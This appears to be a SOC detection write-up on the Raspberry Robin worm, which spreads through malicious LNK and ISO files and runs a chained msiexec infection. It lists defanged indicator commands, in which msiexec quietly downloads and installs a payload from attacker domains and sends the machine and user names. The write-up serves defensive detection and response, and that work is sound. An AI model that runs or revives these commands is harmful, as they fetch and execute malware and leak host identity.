# **.LNK or .ISO embedding Malicious Commands from Raspberry Robin Campaign**

<h2> Introduction </h2>
This certain detection is specific to the Raspberry Robin Campaign. The infection consists of an intelligent worm that propagates over removable USB devices containing malicious a .LNK file and leverages compromised QNAP network-attached storage (NAS) devices for command-and-control. It was first documented by researchers from Red Canary in May 2022. There has been much public debate about whether the Raspberry Robin drives use autoruns to launch or if it relies purely on social engineering to encourage users to click the LNK file. In other scenarios, phishing emails containing .ISO files have been used to load this infection, but mainly shortcut files (.LNK) embedded with malicious command line code have been the primary vector. Shortcut files are typically used to quickly access a program or folder from your personal computer desktop and .ISO files (Optical disk images) are perfect representations of an entire CD, DVD, or BD which are capable of unwanted program installations.

The full attack chain can be found in the image below:

<h2> IOCs and TTPs </h2>
Now that we understand the origins of this malicious activity and the functionality of the file types which carry the embedded code, we can start to breakdown the attack chain into identifiable parts. 

**[SOC specific watchlist description and detection tuning as well as SOC specific investigation procedures, redacted for security purposes]**

The command spawning from the original detection should replicate the above image and be spawning similar commands. As the normal installation proceeds, the msiexec.exe command listed above creates another msiexec.exe /V process, launched from services.exe. This second msiexec.exe /V process then spawns a third msiexec.exe process, which loads a malicious module named msi[...].tmp and is the malware stage downloaded from its parent msiexec.exe /V process.

**msIEXeC -Q/i ""htTP[]//6y.RE:8080/5CBniie70Rw/[Machine name]=[Victim username]"** <br>
**mSIExEC /Q -I"hTTP[]//u0.pm:8080/80wOpGuotSU/USER-PC?admin"**

If not done so already, once this activity is observed, **IMMEDIATELY** isolate the host in question. This is guaranteed to be confirmed malicious activity and the proper recommendation is to escalate this alert to our forensics team and the appropriate Team Lead within the SOC. The client should be notified immediately after isolation and asked to provide any recent USB activity conducted or phishing attempts identified by the user.
